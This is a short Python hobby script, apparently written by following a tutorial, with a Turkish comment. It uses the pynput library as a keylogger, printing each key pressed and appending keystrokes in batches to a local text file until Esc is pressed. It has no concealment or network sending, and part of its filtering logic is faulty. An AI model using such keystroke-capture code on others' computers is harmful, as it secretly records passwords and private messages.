import pynput

from pynput.keyboard import Key, Listener

count = 0
keys= []

def on_press(key):
	global keys, count
	
	keys.append(key)
	count += 1
	print("{} pressed".format(key))	# tutorial'da {}'ın içine 0 mı ne yazdı anlamadım.
	
	if count >= 10:
		count = 0	# reset
		write_file(keys)
		keys = []	# reset
	
def write_file(keys):
	with open(r'C:\Users\Emre\Desktop\14.08.09_the_mechanic\python\genel_python\Small-works\some_programs\keylogger_log.txt','a+') as f:
		for key in keys:
			k = str(key)
			if k.find('space') > 0:
				f.write('\n')
			elif k.find('Key') == 0:
				# f.write('\n')
				pass
			elif k.find("'") == 0 and len(k) == 1:
				f.write(k.replace('"',''))
			else:
				f.write(k.replace("'",""))
	
def on_release(key):
	if key == Key.esc:
		write_file(keys)
		return False
	

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()